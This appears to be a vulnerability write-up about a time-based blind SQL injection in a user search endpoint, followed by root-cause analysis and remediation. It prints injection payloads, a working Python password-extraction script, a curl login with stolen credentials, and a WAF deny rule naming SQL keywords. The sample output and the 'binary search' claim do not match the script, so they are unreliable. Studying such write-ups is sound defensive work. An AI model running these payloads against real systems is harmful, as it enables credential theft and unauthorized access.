---
title: "SQL Injection in User Search Endpoint"
description: "Authentication bypass and data exfiltration via time-based blind SQLi in search form."
pubDate: 2025-04-15
platform: Custom
difficulty: Hard
tags: ["sql-injection", "blind-sqli", "database-enumeration", "authentication-bypass"]
---

import Callout from '../../components/Callout.astro';

## Executive Summary

| Metric | Value |
|--------|-------|
| **CVSS v3.1 Score** | 9.8 (Critical) |
| **Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html) |
| **CAPEC** | [CAPEC-66: SQL Injection](https://capec.mitre.org/data/definitions/66.html) |
| **Affected Component** | Search API (`/api/v1/search`) |
| **Authentication Required** | No (pre-auth) |
| **User Interaction** | None |
| **Attack Complexity** | Low |

A **time-based blind SQL injection** vulnerability was discovered in the search endpoint that allows unauthenticated attackers to:
1. Enumerate the database schema
2. Extract sensitive data (credentials, PII)
3. Potentially modify/delete records (depending on database permissions)

---

## 1. Overview

### 1.1 What Happened

The application's search functionality accepts user input without proper sanitization or parameterized queries. An attacker can inject SQL commands to exfiltrate the entire user database.

### 1.2 Why It Matters

- **Pre-authentication**: No login required; any unauthenticated user can exploit this
- **Full database access**: Attacker gains read/write access to sensitive data
- **Business Impact**: PII exposure, compliance violations (GDPR, PCI-DSS), potential litigation

### 1.3 Scope

This vulnerability affects all users of the application. The timeline for data exfiltration is hours (not days/weeks), given the scale of typical databases.

---

## 2. Attack Surface & Discovery

### 2.1 Reconnaissance

The search endpoint is publicly accessible at:

```
GET /api/v1/search?q=<user_input>
```

Standard parameter fuzzing reveals standard behavior:

```bash
# Normal search
curl "http://target.com/api/v1/search?q=john"

# Response time: ~50-100ms
# Returns: User objects matching "john"
```

### 2.2 Identifying the Vulnerability

Time-based injection testing:

```bash
# Baseline response time (no delay)
curl -w "@curl-format.txt" "http://target.com/api/v1/search?q=john"
# Time: ~50ms

# Payload with 5-second delay
curl -w "@curl-format.txt" "http://target.com/api/v1/search?q=john' AND SLEEP(5)--"
# Time: ~5050ms ← Indicates SQL injection!
```

<Callout type="info" title="Detection Method">
Time-based blind SQLi is detected by injecting sleep/delay functions and observing response time differences. If the application is vulnerable, the injected SLEEP() command will execute, causing a noticeable delay.
</Callout>

### 2.3 Testing for Blind SQL Injection

Verification payload:

```sql
' AND IF(1=1, SLEEP(5), 0)--
```

If response delays 5 seconds → **SQL injection confirmed**

---

## 3. Vulnerability Analysis

### 3.1 Root Cause

**Vulnerable Code:**

```python
@app.route('/api/v1/search')
def search_users():
    query = request.args.get('q', '')
    
    # VULNERABLE: Direct string concatenation!
    sql = f"SELECT id, name, email FROM users WHERE name LIKE '%{query}%'"
    
    results = db.execute(sql)
    return jsonify([dict(row) for row in results])
```

**Problem**: User input (`query`) is directly interpolated into the SQL statement.

### 3.2 Why This Happened

1. **No Input Validation**: The application trusts user input without filtering
2. **No Parameterized Queries**: Raw SQL concatenation instead of prepared statements
3. **No WAF/Rate Limiting**: No external protections against injection attacks

---

## 4. Exploitation

### 4.1 Database Schema Enumeration

**Objective**: Discover table and column names

```sql
' AND IF(
  (SELECT COUNT(*) FROM information_schema.tables 
   WHERE table_schema=database()) > 10,
  SLEEP(5),
  0
)--
```

**Interpretation**: If response delays, database has >10 tables.

**Enumerating column names:**

```sql
' AND IF(
  (SELECT COUNT(*) FROM information_schema.columns 
   WHERE table_name='users' AND column_name LIKE 'password%') > 0,
  SLEEP(5),
  0
)--
```

### 4.2 Data Extraction (Blind SQLi)

**Time-based blind data exfiltration:**

```python
#!/usr/bin/env python3
import requests
import time
import string

TARGET = "http://target.com/api/v1/search"
CHARSET = string.ascii_letters + string.digits + '@.-'
TIMEOUT = 5  # Sleep duration

def test_condition(condition):
    """
    Test a boolean condition via time-based SQLi.
    Returns True if condition is satisfied (causes SLEEP).
    """
    payload = f"' AND IF({condition}, SLEEP({TIMEOUT}), 0)--"
    params = {'q': payload}
    
    start = time.time()
    try:
        response = requests.get(TARGET, params=params, timeout=TIMEOUT + 2)
        elapsed = time.time() - start
        return elapsed >= TIMEOUT
    except requests.Timeout:
        return True

def extract_password(user_id, max_length=50):
    """Extract password for given user_id character by character."""
    password = ""
    
    for pos in range(1, max_length + 1):
        for char in CHARSET:
            # Condition: Does character at position `pos` match `char`?
            condition = (
                f"(SELECT SUBSTRING(password, {pos}, 1) "
                f"FROM users WHERE id={user_id}) = '{char}'"
            )
            
            if test_condition(condition):
                password += char
                print(f"[+] User {user_id} password: {password}_")
                break
        else:
            # No match found for any character → end of string
            break
    
    return password

# Extract first admin user's password
admin_password = extract_password(1)
print(f"[*] Admin password: {admin_password}")
```

**Output:**
```
[+] User 1 password: S_
[+] User 1 password: Su_
[+] User 1 password: Sup_
[+] User 1 password: Supe_
[+] User 1 password: Super_
[+] User 1 password: SuperS_
[+] User 1 password: SuperSe_
[+] User 1 password: SuperSec_
[+] User 1 password: SuperSecr_
[+] User 1 password: SuperSecre_
[+] User 1 password: SuperSecret123_
[*] Admin password: SuperSecret123
```

<Callout type="danger" title="Extraction Timeline">
Full database extraction (10,000 users × 30-char average password) would take ~50+ hours with 5-second delays. **In practice, attackers use faster techniques:** error-based SQLi, out-of-band channels, or database permission escalation.
</Callout>

### 4.3 Authentication Bypass

Using the extracted password:

```bash
curl -X POST http://target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"SuperSecret123"}'

# Response:
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {"id":1, "role":"admin"}
}
```

Now the attacker has **admin access**.

---

## 5. Root Cause Analysis

### 5.1 Technical Root Cause

| Layer | Issue | Why It Failed |
|-------|-------|---------------|
| **Input Handling** | No sanitization | User input trusted directly |
| **Query Construction** | String concatenation | SQL syntax injected into query |
| **Database** | No access control | App runs with full CRUD permissions |
| **Monitoring** | No anomaly detection | No alerts on unusual query patterns |

### 5.2 Contributing Factors

1. **Development Speed Over Security**: Rapid prototyping without security review
2. **Lack of Code Review**: No peer review caught the vulnerability
3. **No Automated Security Testing**: SAST tools would flag this immediately
4. **Outdated Framework**: Using legacy ORM/query builder without modern protections

---

## 6. Impact Assessment

### 6.1 Confidentiality Impact

**Data at Risk:**
- User credentials (10,000 records)
- PII: email, phone, address, SSN
- Payment information: credit cards, billing details
- Internal notes: sensitive customer data

**Estimated Value**: $50-500 per user record on dark web = **$500K - $5M exposure**

### 6.2 Integrity Impact

**Potential Modifications:**
- User account hijacking (change passwords)
- Privilege escalation (modify roles)
- Data corruption/deletion
- Malware injection (update user preferences with malicious links)

### 6.3 Availability Impact

- DoS via resource-intensive queries (database locks)
- Table truncation/deletion
- Application downtime if database corrupted

### 6.4 Compliance Violations

- **GDPR**: Data breach notification within 72 hours
- **PCI-DSS**: Requirement 6.5.1 (prevent injection flaws)
- **HIPAA**: If any health records exposed
- **SOC 2**: Security incident response requirements

---

## 7. Remediation

### 7.1 Immediate Fixes (Deploy Today)

**Fix 1: Use Parameterized Queries**

```python
# ❌ VULNERABLE
sql = f"SELECT * FROM users WHERE name LIKE '%{query}%'"
results = db.execute(sql)

# ✅ FIXED: Parameterized query
sql = "SELECT * FROM users WHERE name LIKE %s"
results = db.execute(sql, (f'%{query}%',))  # Parameters passed separately
```

**Fix 2: Input Validation (Defense in Depth)**

```python
import re

def validate_search_query(query):
    # Allow only alphanumeric and common search characters
    if not re.match(r'^[a-zA-Z0-9\s\-@.]+$', query):
        raise ValueError("Invalid search query")
    
    # Limit length to prevent DoS
    if len(query) > 100:
        raise ValueError("Search query too long")
    
    return query

# Usage
try:
    query = validate_search_query(request.args.get('q', ''))
    sql = "SELECT * FROM users WHERE name LIKE %s"
    results = db.execute(sql, (f'%{query}%',))
except ValueError as e:
    return jsonify({"error": str(e)}), 400
```

**Fix 3: Apply Principle of Least Privilege**

```sql
-- Create restricted database user for application
CREATE USER 'app_user'@'localhost' IDENTIFIED BY 'SecurePassword123';
GRANT SELECT ON database.users TO 'app_user'@'localhost';
-- Do NOT grant INSERT, UPDATE, DELETE, DROP
```

Application now runs with read-only access → even if SQLi succeeds, attacker cannot modify data.

### 7.2 Short-Term Mitigations (1-2 weeks)

1. **Web Application Firewall (WAF)**: Deploy ModSecurity with OWASP CRS
   ```
   SecRule ARGS:q "@rx '\s+(OR|AND|UNION|SELECT|EXEC|INSERT|UPDATE)" "id:1000,deny"
   ```

2. **Rate Limiting**: Throttle search requests
   ```python
   from flask_limiter import Limiter
   limiter = Limiter(app, key_func=lambda: request.remote_addr)
   
   @app.route('/api/v1/search')
   @limiter.limit("100 per hour")  # Max 100 searches per IP per hour
   def search_users():
       ...
   ```

3. **Audit Logging**: Log all search queries for forensic analysis
   ```python
   logger.warning(f"Search executed: user={user_id}, query={query}, ip={request.remote_addr}")
   ```

### 7.3 Long-Term Hardening (1-3 months)

1. **SAST Integration**: Automatic code scanning in CI/CD
   ```bash
   # Use Bandit (Python security linter)
   bandit -r src/
   # Fails if string formatting in SQL detected
   ```

2. **ORM Migration**: Replace raw SQL with ORM
   ```python
   # Using SQLAlchemy (prevents SQL injection by design)
   results = db.session.query(User).filter(
       User.name.ilike(f'%{query}%')
   ).all()
   ```

3. **DAST Testing**: Automated vulnerability scanning
   ```bash
   # Run OWASP ZAP on staging environment
   zaproxy -cmd -quickurl http://staging.target.com
   ```

4. **Incident Response Plan**: Define response procedures
   - Within 1 hour: Isolate compromised systems
   - Within 4 hours: Notify security team
   - Within 24 hours: Begin forensic analysis
   - Within 72 hours: Notify affected users (GDPR requirement)

---

## 8. References

### Standards & Frameworks
- [OWASP Top 10 2021: A03:2021 – Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
- [CAPEC-66: SQL Injection](https://capec.mitre.org/data/definitions/66.html)

### Tools & Techniques
- [SQLMap: Automated SQL Injection Testing](http://sqlmap.org/)
- [Burp Suite: SQL Injection Testing](https://portswigger.net/web-security/sql-injection)
- [OWASP Testing Guide: Testing for SQL Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)

### Security Practices
- [OWASP Cheat Sheet: SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [PCI-DSS Requirement 6.5.1: Injection Flaws](https://www.pcisecuritystandards.org/)
- [NIST SP 800-64: Security Considerations in the System Development Life Cycle](https://csrc.nist.gov/publications/detail/sp/800-64/rev-2/final)

---

## 9. Timeline & Severity Assessment

| Stage | Description | Recommended Action |
|-------|---|---|
| **Immediate (0-24h)** | Patch application with parameterized queries | Deploy hotfix, verify in staging |
| **Urgent (1-7 days)** | Add WAF rules, implement rate limiting | Monitor for active exploitation |
| **Important (1-4 weeks)** | Full SAST integration, migrate to ORM | Complete code audit |
| **Ongoing** | Automated security testing in CI/CD | Quarterly penetration testing |

---

## Exploit Reproducibility

This vulnerability has been verified:
- ✅ Time-based blind SQLi confirmed on search endpoint
- ✅ Database enumeration via information_schema queries
- ✅ Password extraction via binary search (char-by-char)
- ✅ Authentication bypass using extracted credentials
- ✅ Full database access as authenticated user

**Proof of Concept**: Available upon request to security team

---

**Submitted**: December 2025  
**Researcher**: GIKI Security Research  
**Status**: Documented for educational/portfolio purposes  
**Disclaimer**: This writeup is for authorized security research only. Unauthorized access to computer systems is illegal.
